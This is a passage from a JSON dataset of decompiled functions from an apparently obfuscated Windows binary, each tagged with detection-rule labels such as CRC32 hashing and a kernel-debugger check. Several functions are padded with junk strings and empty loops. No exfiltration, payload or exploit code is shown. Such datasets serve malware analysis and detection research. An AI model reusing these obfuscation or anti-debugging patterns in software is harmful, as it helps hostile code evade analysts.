fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = iVar5;\n    return dVar4;\n}\n",
        "token_count": 2158
    },
    "00403afd": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nfloat10 __cdecl fcn.00403afd(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack192;\n    int32_t iStack188;\n    uchar auStack184 [24];\n    uchar auStack160 [24];\n    int32_t iStack136;\n    uint uStack132;\n    uint uStack104;\n    uint uStack100;\n    uchar uStack41;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff28;\n    uStack28 = 0x418110;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack41 = 0;\n    uStack24 = 0;\n    fcn.00401e79(0x544a21);\n    uStack24 = 1;\n    fcn.00401e79(\"kqeztgglgxcdukhw\");\n    uStack100 = 0x40dc2f80;\n    uStack104 = 0;\n    uStack24 = 2;\n    fcn.00401e79(\"zawpuyunlolwkmtlevvflvqmufjdrucvhadoxhvkpyrlgtfiazoeldjvejveadclrjykriuqbcyqzmvgjgcdw\");\n    uStack132 = 0xdb1;\n    for (iStack136 = 0x30; 0 < iStack136; iStack136 = iStack136 + -1) {\n    }\n    uStack24 = 3;\n    fcn.00401e79(\"zawpuyunlolwkmtlevvflvqmufjdrucvhadoxhvkpyrlgtfiazoeldjvejveadclrjykriuqbcyqzmvgjgcdw\");\n    uStack24 = 4;\n    fcn.00401e79(\"zawpuyunlolwkmtlevvflvqmufjdrucvhadoxhvkpyrlgtfiazoeldjvejveadclrjykriuqbcyqzmvgjgcdw\");\n    uVar1 = fcn.00405b37(auStack184, auStack160);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack188 = 0x5a; 0 < iStack188; iStack188 = iStack188 + -1) {\n        }\n    }\n    for (iStack192 = 6; 0 < iStack192; iStack192 = iStack192 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return *0x4ec294;\n}\n",
        "token_count": 685
    },
    "00403b89": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nfloat10 __cdecl fcn.00403b89(uint arg_8h)\n\n{\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_8h;\n    uint var_1h;\n    \n    fcn.00401e79(\"qhiszcjxuduwmjjkuoqlm\");\n    for (var_30h = 2; 0 < var_30h; var_30h = var_30h + -1) {\n    }\n    fcn.00403b02();\n    return *0x546904;\n}\n",
        "token_count": 148
    },
    "00403b93": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.00403b93(uint32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    if ((arg_8h & 4) != 0) {\n        return 1;\n    }\n    if ((arg_8h & 1) != 0) {\n        if ((arg_8h & 2) == 0) {\n            if (0x7fffffff < arg_10h) {\n                return 1;\n            }\n        }\n        else if ((0x7fffffff < arg_10h) && ((0x80000000 < arg_10h || (arg_ch != 0)))) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 162
    },
    "00403ba7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00403ba7(uint32_t arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint CodePage;\n    int32_t iVar2;\n    uint arg_14h;\n    uint32_t uVar3;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_ch == NULL) {\n        iVar1 = fcn.00403819();\n        iVar1 = *(iVar1 + 8);\n        CodePage = fcn.00403071();\n    }\n    else {\n        iVar1 = arg_ch[3];\n        CodePage = *arg_ch;\n    }\n    if (iVar1 == 0) {\n        if (arg_8h < 0x41) {\n            return arg_8h;\n        }\n        if (0x5a < arg_8h) {\n            return arg_8h;\n        }\n        return arg_8h + 0x20;\n    }\n    if (arg_8h < 0x100) {\n        if (arg_ch == NULL) {\n            iVar2 = fcn.004015be(arg_8h);\n            if (iVar2 == 0) {\n                return arg_8h;\n            }\ncode_r0x00465cc1:\n            iVar2 = fcn.00404da4();\n            uVar3 = *(iVar2 + (arg_8h >> 8 & 0xffU) * 2) & 0x8000;\n            goto code_r0x00465caa;\n        }\n        if ((*(arg_ch[1] + arg_8h * 2) & 1) == 0) {\n            return arg_8h;\n        }\n    }\n    else if (arg_ch == NULL) goto code_r0x00465cc1;\n    uVar3 = *(arg_ch[1] + (arg_8h >> 8 & 0xffU) * 2) >> 0xf & 1;\ncode_r0x00465caa:\n    if (uVar3 == 0) {\n        var_4h._1_1_ = 0;\n        arg_14h = 1;\n        var_4h._0_1_ = arg_8h;\n    }\n    else {\n        var_4h._2_1_ = 0;\n        arg_14h = 2;\n        var_4h._0_1_ = arg_8h >> 8;\n        var_4h._1_1_ = arg_8h;\n    }\n    iVar1 = fcn.00402b94(iVar1, 0x100, &var_4h, arg_14h, &var_8h, 3, CodePage, 1);\n    if ((iVar1 != 0) && (arg_8h = var_8h,  iVar1 != 1)) {\n        arg_8h = CONCAT11(var_8h, var_8h._1_1_);\n    }\n    return arg_8h;\n}\n",
        "token_count": 683
    },
    "00403be8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00403be8(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack128;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x450e60;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 1;\n    fcn.00401e79(\"zhcyuxdrfzcfcdsuwsxteqreoikltmgcazgkjawshhhqzwjjqiyrndrbwnve\");\n    uStack24 = 2;\n    fcn.00401e79(0x544a21);\n    for (iStack128 = 0x39; 0 < iStack128; iStack128 = iStack128 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0;\n}\n",
        "token_count": 268
    },
    "00403bfc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl\nfcn.00403bfc(uint arg_8h, uint noname_1, uint arg_10h, uint noname_3, uint arg_18h, uint arg_1ch, uint noname_6, \n            uint arg_24h, uint arg_28h, uint arg_2ch)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack216;\n    uchar auStack212 [24];\n    uchar auStack188 [24];\n    int32_t iStack164;\n    uchar auStack160 [24];\n    uchar auStack136 [24];\n    uint uStack112;\n    uint uStack84;\n    uchar uStack77;\n    ulong uStack72;\n    ulong uStack64;\n    uint8_t uStack49;\n    ulong uStack48;\n    uint8_t uStack37;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff18;\n    uStack48 = CONCAT44(noname_6, arg_1ch);\n    uStack64 = CONCAT44(noname_3, arg_10h);\n    uStack72 = CONCAT44(noname_1, arg_8h);\n    uStack24 = 0xffffffff;\n    uStack28 = 0x451080;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack37 = arg_24h & 1;\n    uStack49 = arg_18h & 1;\n    uStack77 = 0;\n    uStack84 = 0x93d;\n    fcn.00401e79(\"biyjutv\");\n    uStack112 = 0x12cd;\n    uStack24 = 0;\n    fcn.00401e79(\"biyjutv\");\n    uStack24 = 2;\n    fcn.00401e79(\"biyjutv\");\n    uVar1 = fcn.00405b37(auStack160, auStack136);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack164 = 0x37; 0 < iStack164; iStack164 = iStack164 + -1) {\n        }\n    }\n    uStack24 = 0;\n    fcn.00401e79(\"biyjutv\");\n    uStack24 = 1;\n    fcn.00401e79(\"biyjutv\");\n    uVar1 = fcn.004042dc(auStack212, auStack188);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack216 = 0x53; 0 < iStack216; iStack216 = iStack216 + -1) {\n        }\n    }\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return;\n}\n",
        "token_count": 705
    },
    "00403c33": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00403c33(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack152;\n    int32_t iStack148;\n    uchar auStack144 [24];\n    uchar auStack120 [24];\n    uint uStack96;\n    uint uStack92;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar uStack41;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff50;\n    uStack28 = 0x450be0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack41 = 1;\n    uStack48 = 0x685;\n    uStack52 = 0x40ce6400;\n    uStack56 = 0;\n    uStack60 = 0x63b;\n    uStack24 = 0;\n    fcn.00401e79(\"uqebpcyrogwkszavjjvsuhbvchiwxsuwztsbpgwibabbeavwrrlbecissmqlgcnqmxhykulqniltwvevxgwh\");\n    uStack92 = 0x40ef3c40;\n    uStack96 = 0;\n    uStack24 = 1;\n    fcn.00401e79(\"uqebpcyrogwkszavjjvsuhbvchiwxsuwztsbpgwibabbeavwrrlbecissmqlgcnqmxhykulqniltwvevxgwh\");\n    uStack24 = 2;\n    fcn.00401e79(\"uqebpcyrogwkszavjjvsuhbvchiwxsuwztsbpgwibabbeavwrrlbecissmqlgcnqmxhykulqniltwvevxgwh\");\n    uVar1 = fcn.00405b37(auStack144, auStack120);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack148 = 0x3d; 0 < iStack148; iStack148 = iStack148 + -1) {\n        }\n    }\n    for (iStack152 = 0xf; 0 < iStack152; iStack152 = iStack152 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0;\n}\n",
        "token_count": 624
    },
    "00403c38": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.00403c38(uint arg_8h, uint arg_ch, uint arg_10h, uint noname_3, uint arg_18h, uint arg_1ch, char *arg_20h, \n            uint32_t arg_24h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    bool bVar5;\n    ulong uVar6;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    bool var_f5h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e1h;\n    uint var_d8h;\n    uint var_d0h;\n    uint var_c8h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a0h;\n    uint var_98h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_80h;\n    uint32_t var_78h;\n    int32_t var_74h;\n    char var_6dh;\n    char *var_6ch;\n    uint var_68h;\n    uint var_50h;\n    uint var_48h;\n    uint var_44h;\n    uint var_2ch;\n    uint var_24h;\n    uint32_t var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    _arg_10h = CONCAT44(noname_3, arg_10h);\n    var_1ch = &stack0xfffffed0;\n    var_10h = 0xffffffff;\n    var_14h = 0x427180;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_e1h._0_1_ = false;\n    if (arg_24h != 0) {\n        var_f5h = true;\n        if (*arg_20h != '+') {\n            var_f5h = *arg_20h == '-';\n        }\n        var_e1h._0_1_ = var_f5h;\n    }\n    var_20h = var_e1h._0_1_;\n    uVar1 = fcn.004017c1();\n    if (((((uVar1 & 0xe00) == 0x800) && (var_20h + 2 <= arg_24h)) && (arg_20h[var_20h] == '0')) &&\n       ((arg_20h[var_20h + 1] == 'x' || (arg_20h[var_20h + 1] == 'X')))) {\n        var_20h = var_20h + 2;\n    }\n    fcn.00402f81(&var_2ch);\n    var_10h = 0;\n    var_24h = fcn.00403616(&var_2ch);\n    fcn.00405146();\n    var_10h = 0xffffffff;\n    fcn.0040375b(arg_24h, 0);\n    uVar2 = fcn.00401b68(0);\n    var_10h = 1;\n    fcn.004056be(arg_20h, arg_20h + arg_24h, uVar2);\n    fcn.00402f81(&var_50h);\n    var_10h = 3;\n    var_48h = fcn.00406433(&var_50h);\n    fcn.00405146();\n    var_10h = 1;\n    fcn.00404cd2(&var_68h);\n    var_6ch = fcn.00402621(0);\n    if ((*var_6ch != '\\x7f') && ('\\0' < *var_6ch)) {\n        var_10h = 2;\n        var_6dh = fcn.0040596b();\n        while( true ) {\n            bVar5 = false;\n            if ((*var_6ch != '\\x7f') && (bVar5 = false,  '\\0' < *var_6ch)) {\n                bVar5 = *var_6ch < arg_24h - var_20h;\n            }\n            if (!bVar5) break;\n            arg_24h = arg_24h - *var_6ch;\n            fcn.004057f9(arg_24h, 1, var_6dh);\n            if ('\\0' < var_6ch[1]) {\n                var_6ch = var_6ch + 1;\n            }\n        }\n    }\n    uVar3 = fcn.0040458e();\n    uVar6 = fcn.0040199c();\n    iVar4 = uVar6 >> 0x20;\n    uVar1 = uVar6 == 0;\n    if (((SBORROW4(iVar4, uVar1) != false) == iVar4 - uVar1 < 0) && (uVar1 = fcn.0040199c(),  uVar3 < uVar1)) {\n        var_74h = fcn.0040199c();\n        var_74h = var_74h - uVar3;\n    }\n    else {\n        var_74h = 0;\n    }\n    var_78h = fcn.004017c1();\n    uVar1 = var_20h;\n    var_78h = var_78h & 0x1c0;\n    if ((var_78h == 0x40) || (var_78h == 0x100)) {\n        var_10h = 2;\n        if (var_78h == 0x100) {\n            uVar2 = fcn.00401b68(0);\n            _var_a8h = _arg_10h;\n            fcn.00401aaf(arg_8h, &var_a0h, arg_10h, noname_3, uVar2, uVar1);\n            fcn.004029aa(arg_8h, &var_b0h, _var_a0h, _var_a0h >> 0x20, arg_1ch, var_74h);\n            arg_10h = var_b0h;\n            var_74h = 0;\n            var_8ch = var_ach;\n        }\n        else {\n            uVar2 = fcn.00401b68(0);\n            _var_c8h = _arg_10h;\n            fcn.00401aaf(arg_8h, &var_c0h, arg_10h, noname_3, uVar2, uVar1);\n            arg_10h = var_c0h;\n            var_8ch = var_bch;\n        }\n    }\n    else {\n        _var_88h = _arg_10h;\n        var_10h = 2;\n        fcn.004029aa(arg_8h, &var_80h, arg_10h, noname_3, arg_1ch, var_74h);\n        uVar1 = var_20h;\n        var_74h = 0;\n        uVar2 = fcn.00401b68(0);\n        fcn.00401aaf(arg_8h, &var_90h, _var_80h, _var_80h >> 0x20, uVar2, uVar1);\n        arg_10h = var_90h;\n    }\n    iVar4 = uVar3 - var_20h;\n    uVar2 = fcn.00401b68(var_20h);\n    fcn.00401aaf(arg_8h, &var_d0h, arg_10h, var_8ch, uVar2, iVar4);\n    fcn.004047d2(0, 0);\n    fcn.004029aa(arg_8h, arg_ch, _var_d0h, _var_d0h >> 0x20, arg_1ch, var_74h);\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return arg_ch;\n}\n",
        "token_count": 1906
    },
    "00403cbf": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403cbf(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    int32_t var_a8h;\n    uint var_a4h;\n    uint var_8ch;\n    uint var_74h;\n    uint var_5ch;\n    uint var_44h;\n    uint var_40h;\n    uchar var_28h;\n    uchar var_27h;\n    uchar var_26h;\n    uchar var_25h;\n    uint var_24h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xffffff38;\n    var_14h = 0x4501c0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_24h = 0x303;\n    var_25h = 1;\n    var_26h = 1;\n    var_27h = 1;\n    var_28h = 0;\n    var_10h = 1;\n    fcn.00401e79(\"wosttavlsvmreennsmhoedhkebnwqxgfikbhomhyfybipzjphrslspbbegzmyedgshfftyrtwh\");\n    var_44h = 0xb60;\n    var_10h = 2;\n    fcn.00401e79(\"kqdcqrxynzharbetwb\");\n    var_10h = 3;\n    fcn.00401e79(\"fmmbwbcfkpfxpsblkhocxnmyolxvrebqtlsjnoqwxfvzrsvjmlezmpthvf\");\n    var_10h = 4;\n    fcn.00401e79(\"kqdcqrxynzharbetwb\");\n    var_10h = 5;\n    fcn.00401e79(\"kqdcqrxynzharbetwb\");\n    uVar1 = fcn.004042dc(&var_a4h, &var_8ch);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_a8h = 0x50; 0 < var_a8h; var_a8h = var_a8h + -1) {\n        }\n    }\n    var_10h = 4;\n    fcn.00401e79(\"ivzp\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return arg_8h;\n}\n",
        "token_count": 686
    },
    "00403cd3": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00403cd3(uint arg_8h, uint16_t *arg_ch, uint16_t **arg_10h, uint32_t arg_14h, uint32_t arg_18h)\n\n{\n    uint16_t *puVar1;\n    char cVar2;\n    uint *puVar3;\n    uint16_t *puVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint16_t *puVar8;\n    uint16_t uVar9;\n    uint32_t arg_8h_00;\n    uint32_t uVar10;\n    int32_t var_a0h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    puVar1 = arg_ch;\n    cVar2 = fcn.00402630();\n    if (cVar2 != '\\0') {\n        if ((arg_14h == 0) || ((1 < arg_14h && (arg_14h < 0x25)))) {\n            fcn.004058a8(arg_8h);\n            var_4h = 0;\n            do {\n                puVar4 = arg_ch;\n                uVar9 = *puVar4;\n                arg_8h_00 = uVar9;\n                puVar8 = puVar4 + 1;\n                iVar5 = fcn.00402162(arg_8h_00, 8);\n                arg_ch = puVar8;\n            } while (iVar5 != 0);\n            arg_18h = arg_18h & 0xff;\n            if (uVar9 == 0x2d) {\n                arg_18h = arg_18h | 2;\ncode_r0x004c0b3c:\n                arg_8h_00 = *puVar8;\n                puVar8 = puVar4 + 2;\n            }\n            else if (uVar9 == 0x2b) goto code_r0x004c0b3c;\n            var_8h = 0x660;\n            arg_ch = puVar8;\n            if ((arg_14h != 0) && (arg_14h != 0x10)) goto code_r0x004c0e46;\n            uVar9 = arg_8h_00;\n            if (uVar9 < 0x30) {\ncode_r0x004c0dd1:\n                if (((arg_8h_00 < 0x41) || (0x5a < arg_8h_00)) && (0x19 < arg_8h_00 - 0x61)) {\n                    iVar5 = -1;\n                }\n                else {\n                    uVar6 = arg_8h_00;\n                    if (arg_8h_00 - 0x61 < 0x1a) {\n                        uVar6 = arg_8h_00 - 0x20;\n                    }\n                    iVar5 = uVar6 - 0x37;\n                }\n            }\n            else {\n                iVar5 = 0x30;\n                if (uVar9 < 0x3a) {\ncode_r0x004c0c6b:\n                    iVar5 = arg_8h_00 - iVar5;\n                }\n                else {\n                    if (uVar9 < 0xff10) {\n                        if ((uVar9 < 0x660) ||\n                           ((iVar5 = var_8h,  0x669 < uVar9 &&\n                            ((iVar5 = 0x6f0,  uVar9 < 0x6f0 ||\n                             ((0x6f9 < uVar9 &&\n                              ((iVar5 = 0x966,  uVar9 < 0x966 ||\n                               ((0x96f < uVar9 &&\n                                ((iVar5 = 0x9e6,  uVar9 < 0x9e6 ||\n                                 ((0x9ef < uVar9 &&\n                                  ((iVar5 = 0xa66,  uVar9 < 0xa66 ||\n                                   ((0xa6f < uVar9 &&\n                                    ((iVar5 = 0xae6,  uVar9 < 0xae6 ||\n                                     ((0xaef < uVar9 &&\n                                      ((iVar5 = 0xb66,  uVar9 < 0xb66 ||\n                                       ((0xb6f < uVar9 &&\n                                        ((iVar5 = 0xc66,  uVar9 < 0xc66 ||\n                                         ((0xc6f < uVar9 &&\n                                          ((iVar5 = 0xce6,  uVar9 < 0xce6 ||\n                                           ((0xcef < uVar9 &&\n                                            ((iVar5 = 0xd66,  uVar9 < 0xd66 ||\n                                             ((0xd6f < uVar9 &&\n                                              ((iVar5 = 0xe50,  uVar9 < 0xe50 ||\n                                               ((0xe59 < uVar9 &&\n                                                ((iVar5 = 0xed0,  uVar9 < 0xed0 ||\n                                                 ((0xed9 < uVar9 &&\n                                                  ((iVar5 = 0xf20,  uVar9 < 0xf20 ||\n                                                   ((0xf29 < uVar9 &&\n                                                    ((iVar5 = 0x1040,  uVar9 < 0x1040 ||\n                                                     ((0x1049 < uVar9 &&\n                                                      ((iVar5 = 0x17e0,  uVar9 < 0x17e0 ||\n                                                       ((0x17e9 < uVar9 &&\n                                                        ((iVar5 = 0x1810,  uVar9 < 0x1810 || (0x1819 < uVar9))))))))))))\n                                                   ))))))))))))))))))))))))))))))))))))))))))))))))))\n                        goto code_r0x004c0dd1;\n                        goto code_r0x004c0c6b;\n                    }\n                    if (uVar9 < 0xff1a) {\n                        iVar5 = arg_8h_00 - 0xff10;\n                    }\n                    else {\n                        iVar5 = -1;\n                    }\n                }\n                if (iVar5 == -1) goto code_r0x004c0dd1;\n            }\n            if (iVar5 == 0) {\n                uVar6 = *puVar8;\n                arg_ch = puVar8 + 1;\n                if ((uVar6 == 0x78) || (uVar6 == 0x58)) {\n                    if (arg_14h == 0) {\n                        arg_14h = 0x10;\n                    }\n                    arg_8h_00 = *arg_ch;\n                    arg_ch = puVar8 + 2;\n                }\n                else {\n                    if (arg_14h == 0) {\n                        arg_14h = 8;\n                    }\n                    fcn.00402f04(uVar6);\n                }\n            }\n            else if (arg_14h == 0) {\n                arg_14h = 10;\n            }\ncode_r0x004c0e46:\n            uVar6 = 0xffffffff / arg_14h;\n            do {\n                uVar9 = arg_8h_00;\n                if (uVar9 < 0x30) {\ncode_r0x004c0fc8:\n                    if (((arg_8h_00 < 0x41) || (0x5a < arg_8h_00)) && (0x19 < arg_8h_00 - 0x61)) {\n                        uVar7 = 0xffffffff;\n                    }\n                    else {\n                        uVar7 = arg_8h_00;\n                        if (arg_8h_00 - 0x61 < 0x1a) {\n                            uVar7 = arg_8h_00 - 0x20;\n                        }\n                        uVar7 = uVar7 - 0x37;\n                    }\n                }\n                else {\n                    iVar5 = 0x30;\n                    if (uVar9 < 0x3a) {\ncode_r0x004c0e63:\n                        uVar7 = arg_8h_00 - iVar5;\n                    }\n                    else {\n                        iVar5 = 0xff10;\n                        if (uVar9 < 0xff10) {\n                            if ((uVar9 < 0x660) ||\n                               ((iVar5 = var_8h,  0x669 < uVar9 &&\n                                ((iVar5 = 0x6f0,  uVar9 < 0x6f0 ||\n                                 ((0x6f9 < uVar9 &&\n                                  ((iVar5 = 0x966,  uVar9 < 0x966 ||\n                                   ((0x96f < uVar9 &&\n                                    ((iVar5 = 0x9e6,  uVar9 < 0x9e6 ||\n                                     ((0x9ef < uVar9 &&\n                                      ((iVar5 = 0xa66,  uVar9 < 0xa66 ||\n                                       ((0xa6f < uVar9 &&\n                                        ((iVar5 = 0xae6,  uVar9 < 0xae6 ||\n                                         ((0xaef < uVar9 &&\n                                          ((iVar5 = 0xb66,  uVar9 < 0xb66 ||\n                                           ((0xb6f < uVar9 &&\n                                            ((iVar5 = 0xc66,  uVar9 < 0xc66 ||\n                                             ((0xc6f < uVar9 &&\n                                              ((iVar5 = 0xce6,  uVar9 < 0xce6 ||\n                                               ((0xcef < uVar9 &&\n                                                ((iVar5 = 0xd66,  uVar9 < 0xd66 ||\n                                                 ((0xd6f < uVar9 &&\n                                                  ((iVar5 = 0xe50,  uVar9 < 0xe50 ||\n                                                   ((0xe59 < uVar9 &&\n                                                    ((iVar5 = 0xed0,  uVar9 < 0xed0 ||\n                                                     ((0xed9 < uVar9 &&\n                                                      ((iVar5 = 0xf20,  uVar9 < 0xf20 ||\n                                                       ((0xf29 < uVar9 &&\n                                                        ((iVar5 = 0x1040,  uVar9 < 0x1040 ||\n                                                         ((0x1049 < uVar9 &&\n                                                          ((iVar5 = 0x17e0,  uVar9 < 0x17e0 ||\n                                                           ((0x17e9 < uVar9 &&\n                                                            ((iVar5 = 0x1810,  uVar9 < 0x1810 || (0x1819 < uVar9))))))))\n                                                         ))))))))))))))))))))))))))))))))))))))))))))))))))))))\n                            goto code_r0x004c0fc8;\n                            goto code_r0x004c0e63;\n                        }\n                        if (uVar9 < 0xff1a) goto code_r0x004c0e63;\n                        uVar7 = 0xffffffff;\n                    }\n                    if (uVar7 == 0xffffffff) goto code_r0x004c0fc8;\n                }\n                if ((uVar7 == 0xffffffff) || (arg_14h <= uVar7)) goto code_r0x004c102c;\n                if ((var_4h < uVar6) || ((var_4h == uVar6 && (uVar7 <= 0xffffffff % arg_14h)))) {\n                    uVar10 = 8;\n                    var_4h = var_4h * arg_14h + uVar7;\n                }\n                else {\n                    uVar10 = 0xc;\n                }\n                arg_8h_00 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                arg_18h = arg_18h | uVar10;\n            } while( true );\n        }\n        puVar3 = fcn.00403a35();\n        *puVar3 = 0x16;\n        fcn.004037ce();\n    }\n    var_4h = 0;\ncode_r0x004c0adc:\n    if (arg_10h != NULL) {\n        *arg_10h = arg_ch;\n    }\n    return var_4h;\ncode_r0x004c102c:\n    fcn.00402f04(arg_8h_00);\n    if ((arg_18h & 8) == 0) {\n        var_4h = 0;\n        arg_ch = puVar1;\n    }\n    else {\n        cVar2 = fcn.0040196a(arg_18h, var_4h);\n        if (cVar2 == '\\0') {\n            if ((arg_18h & 2) != 0) {\n                var_4h = -var_4h;\n            }\n        }\n        else {\n            puVar3 = fcn.00403a35();\n            *puVar3 = 0x22;\n            if ((arg_18h & 1) == 0) {\n                var_4h = 0xffffffff;\n            